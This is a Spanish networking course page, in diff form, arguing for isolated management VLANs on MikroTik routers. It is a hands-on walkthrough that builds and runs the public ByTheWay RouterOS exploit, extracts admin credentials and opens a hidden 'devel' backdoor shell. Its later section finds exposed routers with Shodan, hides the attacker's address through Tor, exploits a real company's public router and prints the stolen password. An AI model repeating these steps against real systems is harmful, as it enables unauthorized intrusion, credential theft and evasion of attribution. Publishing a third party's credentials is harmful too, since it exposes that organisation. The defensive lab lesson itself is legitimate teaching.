@@ -1,0 +1,174 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="es" xml:lang="es" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<link rel="stylesheet" type="text/css" href="base.css" />
+<link rel="stylesheet" type="text/css" href="content.css" />
+<link rel="stylesheet" type="text/css" href="nav.css" />
+<meta http-equiv="content-type" content="text/html;  charset=utf-8" />
+<title>6.3 VLAN para la gestión de los equipos de comunicación/red | UT6. Fortificación de la red interna: segmentación de red </title>
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+<meta http-equiv="content-language" content="es" />
+<meta name="author" content="Juan Carlos Requena" />
+<link rel="license" type="text/html" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" />
+<meta name="generator" content="eXeLearning 2.7 - exelearning.net" />
+<script type="text/javascript" src="exe_jquery.js"></script>
+<script type="text/javascript" src="common_i18n.js"></script>
+<script type="text/javascript" src="common.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+<body class="exe-web-site" id="exe-node-59"><script type="text/javascript">document.body.className+=" js"</script>
+<div id="content">
+<p id="skipNav"><a href="#main" class="sr-av">Saltar la navegación</a></p>
+<div id="header"  style="background-image: url(logoJCRequena.png); background-repeat: no-repeat;"><div id="headerContent">UT6. Fortificación de la red interna: segmentación de red</div></div>
+<div id="siteNav">
+<ul>
+   <li><a href="index.html" class="daddy main-node">UT6. Fortificación de la red interna: segmentación de red</a></li>
+   <li><a href="objetivos.html" class="no-ch">Objetivos</a></li>
+   <li><a href="1_introduccin.html" class="no-ch">1. Introducción</a></li>
+   <li><a href="2_direccionamiento_ip.html" class="no-ch">2. Direccionamiento IP</a></li>
+   <li><a href="3_segmentacin_de_redes.html" class="no-ch">3. Segmentación de redes</a></li>
+   <li><a href="4_ip_versin_6.html" class="no-ch">4. IP Versión 6</a></li>
+   <li><a href="5_subnetting_y_supernetting.html" class="daddy">5. Subnetting y Supernetting</a>
+   <ul class="other-section">
+      <li><a href="prctica_1_subnetting_vlsm.html" class="no-ch">Práctica 1. Subnetting VLSM</a></li>
+   </ul>
+   </li>
+   <li class="current-page-parent"><a href="6_redes_virtuales_vlans.html" class="current-page-parent daddy">6. Redes virtuales (VLANs)</a>
+   <ul>
+      <li><a href="61_introduccin_a_gns3.html" class="daddy">6.1 Introducción a GNS3</a>
+      <ul class="other-section">
+         <li><a href="611_instalacin_de_gns3.html" class="no-ch">6.1.1 Instalación de GNS3</a></li>
+         <li><a href="612_ejecutar_gns3_y_crear_nuevo_proyecto.html" class="no-ch">6.1.2 Ejecutar GNS3 y crear nuevo Proyecto</a></li>
+         <li><a href="613__interconectar_diferentes_vlan.html" class="no-ch">6.1.3  Interconectar diferentes VLAN</a></li>
+      </ul>
+      </li>
+      <li><a href="prctica_2_segmentacin_de_red_vlan_en_mikrotik_y_switch_cisco.html" class="no-ch">Práctica 2. Segmentación de red: VLAN en Mikrotik y Switch Cisco</a></li>
+      <li><a href="62_fortificacin_de_la_red_en_gns3.html" class="daddy">6.2 Fortificación de la red en GNS3</a>
+      <ul class="other-section">
+         <li><a href="621_ataque_mac_flooding.html" class="no-ch">6.2.1 Ataque MAC flooding</a></li>
+         <li><a href="622_dhcp_starvation.html" class="no-ch">6.2.2 DHCP Starvation</a></li>
+         <li><a href="prctica_3_mitigar_ataques_en_dominio_broadcast.html" class="no-ch">Práctica 3. Mitigar ataques en dominio Broadcast</a></li>
+      </ul>
+      </li>
+      <li id="active"><a href="63_vlan_para_la_gestin_de_los_equipos_de_comunicacinred.html" class="active no-ch">6.3 VLAN para la gestión de los equipos de comunicación/red</a></li>
+      <li><a href="laboratorio_2_vlan_con_open_vswitch.html" class="no-ch">Laboratorio 2. VLAN con Open vSwitch</a></li>
+      <li><a href="prctica_4_vlan_con_open_vswitch.html" class="no-ch">Práctica 4. VLAN con Open vSwitch</a></li>
+      <li><a href="laboratorio_3_vlan_con_tplink.html" class="no-ch">Laboratorio 3. VLAN con tp-link</a></li>
+   </ul>
+   </li>
+   <li><a href="7_microsegmentacin.html" class="no-ch">7. Microsegmentación</a></li>
+</ul>
+</div>
+<div id='topPagination'>
+<div class="pagination noprt">
+<a href="prctica_3_mitigar_ataques_en_dominio_broadcast.html" class="prev"><span><span>&laquo; </span>Anterior</span></a> <span class="sep">| </span><a href="laboratorio_2_vlan_con_open_vswitch.html" class="next"><span>Siguiente<span> &raquo;</span></span></a>
+</div>
+</div>
+<div id="main-wrapper">
+<div id="main"><a name="main"></a>
+<div id="nodeDecoration"><h1 id="nodeTitle">6.3 VLAN para la gestión de los equipos de comunicación/red</h1></div>
+<div class="iDevice_wrapper textIdevice" id="id100">
+<div class="iDevice emphasis0" >
+<div id="ta100_114_2" class="block iDevice_content">
+<div class="exe-text"><h3 style="text-align: justify;">1. Introducción</h3>
+<p style="text-align: justify;">Por seguridad, se debería denegar el acceso a internet del equipo que se conecta a la VLAN de gestión de los equipos. Sólo se debería tener acceso para instalar firmware de los equipos, configuración de los mismos, etcétera, puntualmente.</p>
+<h3 style="text-align: justify;">2. Escenario</h3>
+<ul>
+<li style="text-align: justify;">Router mikrotik con una versión que tiene vulnerabilidades, en concreto, la 6.34.6.</li>
+</ul>
+<p>El router se conecta a un switch que está conectado con Internet y a otro router con una versión más reciente la 7.2.3.</p>
+<p style="text-align: center;"><img src="escenario.png" alt="" width="506" height="354" /></p>
+<p style="text-align: justify;"><strong>Imagen Routeros insegura:</strong></p>
+<ul>
+<li style="text-align: justify;"><a href="https://download.mikrotik.com/routeros/6.34.6/chr-6.34.6.img.zip">https://download.mikrotik.com/routeros/6.34.6/chr-6.34.6.img.zip</a></li>
+</ul>
+<p>Si accedemos al mikrotik 6.34 vemos que ha obtenido una ip en el rango del <strong>virbr0</strong>.</p>
+<p style="text-align: center;"><img src="mikrotik-ip-inseguro.png" alt="" width="455" height="81" /></p>
+<p style="text-align: justify;"></p>
+<p style="text-align: justify;">La obtiene del <strong>virbr0</strong> (ip a en el equipo anfitrión).</p>
+<p style="text-align: center;"><img src="virb0.png" alt="" width="828" height="74" /></p>
+<h3 style="text-align: justify;">3. Objetivo</h3>
+<p style="text-align: justify;">El objetivo es que estos equipos no sean accesibles desde la red 192.168.122.0 (ejemplo que el anfitrión no pueda acceder) ni del resto de redes de la infraestructura. Ahora si se puede, ejemplo, mediante el navegador web: http://192.168.122.97. (usuario admin password hola01).</p>
+<p style="text-align: center;"><img src="acceso-http.png" alt="" width="903" height="487" /></p>
+<h3 style="text-align: justify;">4. Vulnerabilidad en router Mikrotik</h3>
+<p style="text-align: justify;">Supongamos que desde un equipo que está en la red 192.168.122.0, nos descargamos lo siguiente: <a href="https://github.com/tenable/routeros/tree/master/poc/bytheway" target="_blank" rel="noopener">exploit bytheway</a>.</p>
+<p style="text-align: center;"><img src="bythewaqy.png" alt="" width="727" height="200" /></p>
+<p style="text-align: justify;"><br />Previamenet hay que instalar <strong>cmake</strong> y <strong><a href="https://boostorg.jfrog.io/artifactory/main/release/1.66.0/source/" target="_blank" rel="noopener">boost</a></strong>:</p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>apt install cmake</span></pre>
+<p style="text-align: justify;">Después hay que instalar <a href="https://boostorg.jfrog.io/artifactory/main/release/1.66.0/source/" target="_blank" rel="noopener">boost</a>:</p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>wget https://boostorg.jfrog.io/artifactory/main/release/1.79.0/source/boost_1_79_0.tar.gz</span><br /><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>tar zxvf boost_1_79_0.tar.gz</span><br /><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>cd boost_1_79_0</span><br /><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>./bootstrap.sh </span><br /><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>./b2 -j16 --prefix=$(pwd) --libdir=$(pwd)/lib64 --layout=system link=static install</span></pre>
+<p style="text-align: justify;">A continuación, hay que instalar las librerías boost:</p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>sudo apt-get install libboost-all-dev</span></pre>
+<p style="text-align: justify;">Una ves instaladas las librerías, hay que descargar y compilar bytheway.</p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>git clone https://github.com/tenable/routeros.git</span></pre>
+<p style="text-align: center;"><img src="clone.png" alt="" width="612" height="136" /></p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>cd routeros/poc/bytheway</span><br /><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>mkdir build</span><br /><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>cd ./build/</span><br /><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>cmake ..</span><br /><span style="font-size: 12pt;">#o especificamos la ruta donde se tiene boost</span><br /><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>cmake .. -DBOOST_ROOT=/home/jc/Descargas/boost_1_79_0</span><br /><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>make</span><br /><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>./btw -i 192.168.122.97</span></pre>
+<p style="text-align: center;"><img src="make2.png" width="754" height="180" /></p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>./btw -i 192.168.122.97</span></pre>
+<p style="text-align: justify;">Para este caso, la ip 192.168.122.97 es la del mikrotik 6.34.</p>
+<p style="text-align: justify;">Este <strong>exploit</strong> lo que va a hacer es:</p>
+<ul>
+<li style="text-align: justify;">Va a conectarse al router mikrotik y va a intentar extraer las credenciales de administrador del mismo aprovechándose de una vulnrabilidad que tiene la versión 6.34.</li>
+<li style="text-align: justify;">Al ejecutar el comando, se obtienen las credenciales (Using credentials).</li>
+</ul>
+<p style="text-align: center;"><img src="bytheway1.png" alt="" width="653" height="240" /></p>
+<p style="text-align: justify;">El exploit se ha conectado al puerto 8291 (winbox) y por un exploit en el sistema operativo del router en su versión 6.34, ha conseguido obtener las credenciales. Pero no solo eso, también nos ha habilitado para que podamos acceder a una terminal como desarrollador. /flash/nova se considera una backdoor.</p>
+<pre><span style="font-size: 12pt;"><strong> ‘Creating /flash/nova/etc/devel-login on 192.168.122.97:8291’</strong></span></pre>
+<p style="text-align: justify;">De manera que si se hace un telnet con el usuario devel y la contraseña que se ha extraído anteriormente, accederemos.</p>
+<pre><span style="font-size: 12pt;"> telnet -l devel 192.168.122.97</span></pre>
+<p style="text-align: center;"><img src="telnet.png" alt="" width="689" height="196" /></p>
+<p style="text-align: justify;"><br />Hemos accedido en un <strong>BusyBox</strong>, es decir, estamos dentro del sistema Linux (el Sistema operativo del mikrotik es linux). Si ejecutamos <strong>uname -a</strong>, vemos la versión del kernel.</p>
+<p style="text-align: center;"><img src="uname-mikortik.png" alt="" width="639" height="122" /></p>
+<p style="text-align: justify;">Estamos dentro de un <strong>backdoor</strong>, por lo que <strong>un administrador no se daría cuenta nunca</strong> de que alguien ha accedido de esta manera. Aunque cambiara la contraseña del administrador, podríamos entrar igual ya que el usuario devel no es visible.</p>
+<h3 style="text-align: justify;"><strong>5. ¿Porqué hemos podido explotar esta vulnerabilidad?</strong></h3>
+<p style="text-align: justify;">Se ha podido explotar la vulnearbilidad ya que hemos podido acceder desde un Equipo en la red al equipo Mikrotik y eso es lo que no se puede permitir. Por eso, hay que segmentar los dispositivos y configurar una vlan para la gestión de los mismos, ejemplo: VLAN 100. De esta forma, no se depende de las posibles vulnerabilidades de los equipos ya que nos preocupamos que no se puedan acceder a ellos. Esta es la <strong>explicación del porqué configurar una VLAN de gestión de dispositivos</strong>.</p>
+<h3 style="text-align: justify;">6. Si esto lo extrapolamos a la vida real</h3>
+<p style="text-align: justify;">Mediante <a href="https://www.shodan.io/dashboard?language=en" target="_blank" rel="noopener">shodan.io</a>, podemos buscar servicios/puertos abiertos por todas las ip's públicas del mundo.</p>
+<p style="text-align: center;"><img src="shodan.png" alt="" width="1310" height="1040" /></p>
+<p style="text-align: justify;">Si queremos buscar versiones de mikrotik inferiores a 6.42, hay que poner en el buscador: port:8291 os:"Mikrotik RouterOS 6.39.2". Con esto, le estamos indicando shodan que busque ips públicas en todo el mundo que tengan un mikrotik 6.39.2 que es vulnerable.</p>
+<p style="text-align: center;"><img src="shodan2.png" alt="" width="1213" height="1006" /></p>
+<p style="text-align: justify;">Si hacemos una consulta solo por el puerto, encuentra más de 2 millones.</p>
+<p style="text-align: center;"><img src="shodan3.png" alt="" width="1216" height="895" /></p>
+<p style="text-align: justify;">Para explotar el exploit sobre una ip pública que aparece en los resultados, podemos hacer uso de tor, para que no aparezca nuestra ip publica en la explotación del exploit. Para ello instalamos el siguiente paquete (proxy):</p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>sudo apt install tor</span></pre>
+<p><strong>Fuente</strong>: <a href="https://linuxconfig.org/install-tor-proxy-on-ubuntu-20-04-linux">https://linuxconfig.org/install-tor-proxy-on-ubuntu-20-04-linux</a></p>
+<p style="text-align: justify;">Ahora, elegimos una ip publica para la versión 6.34.4 que es vulnerable, para este caso de ejemplo, se elige: </p>
+<pre><span style="font-size: 12pt;">45.115.254.150</span><br /><span style="font-size: 12pt;">Elxire IT Services Pvt. Ltd.</span><br /><span style="font-size: 12pt;">IndiaIndia, Delhi</span></pre>
+<p style="text-align: center;"><img src="ip-pb.png" alt="" width="1212" height="976" /></p>
+<p style="text-align: justify;">A continuación, habilitamos el proxy tor:</p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>source torsocks on</span></pre>
+<p style="text-align: center;"><img src="tor-on.png" alt="" width="617" height="69" /></p>
+<p style="text-align: justify;">A continuación, ejecutamos el exploit:</p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>./btw -i 45.115.254.150</span></pre>
+<p style="text-align: center;"><img src="bytehway-tor.png" alt="" width="666" height="232" /></p>
+<p style="text-align: justify;">Como se puede observar, el usuario es admin y la contraseña elxire:_2014.</p>
+<p style="text-align: justify;">Si comprobamos nuestra ip pública con la que salimos (tor activado), nos da la 185.220.100.246. </p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$</strong>curl 'https://api.ipify.org?format=json'</span></pre>
+<p style="text-align: center;"><img src="curl-1.png" alt="" width="768" height="44" /></p>
+<p style="text-align: justify;">Pero esa no es la ip pública nuestra verdadera, si <strong>desactivamos tor</strong>, podremos consultar la verdadera y que es la 84.123.178.36.</p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$ </strong>source torsocks off<strong><br />jc@jc-Latitude-E6430:~$ </strong>curl 'https://api.ipify.org?format=json'<strong><br /></strong></span></pre>
+<p style="text-align: center;"><img src="curl-2.png" alt="" width="599" height="64" /></p>
+<p style="text-align: center;"><img src="curl-3.png" alt="" width="771" height="57" /></p>
+<p style="text-align: justify;">Otra forma de obtenerla es con el comando:</p>
+<pre><span style="font-size: 12pt;"><strong>jc@jc-Latitude-E6430:~$ </strong>wget -qO - https://api.ipify.org; echo</span></pre>
+<p style="text-align: center;"><img src="wget-ippub.png" alt="" width="760" height="65" /></p>
+<h3 style="text-align: justify;">7. Conclusiones</h3>
+<p style="text-align: justify;">Los dispositivos de red no tienen que estar expuestos ni internamente ni externamente ya sea con ip pública o privada.</p>
+<p style="text-align: justify;">En el siguiente vídeo se describe el proceso del ataque ByTheway sobre un Mikrotik vulnerable.</p>
+<p style="text-align: center;"><iframe width="560" height="314" src="https://youtu.be/shlpXH8Sy7g"></iframe></p>
+<p style="text-align: center;"><em><strong>Vídeo 1.</strong> Ataque ByTheway RouterOS.</em></p></div>
+</div>
+</div>
+</div>
+<div id="packageLicense" class="cc cc-by-nc-sa">
+<p><span>Obra publicada con</span> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Licencia Creative Commons Reconocimiento No comercial Compartir igual 4.0</a></p>
+</div>
+</div>
+</div>
+<div id='bottomPagination'>
+<div class="pagination noprt">
+<a href="prctica_3_mitigar_ataques_en_dominio_broadcast.html" class="prev"><span><span>&laquo; </span>Anterior</span></a> <span class="sep">| </span><a href="laboratorio_2_vlan_con_open_vswitch.html" class="next"><span>Siguiente<span> &raquo;</span></span></a>
+</div>
+</div>
+</div>
+<script type="text/javascript" src="_style_js.js"></script></body></html>
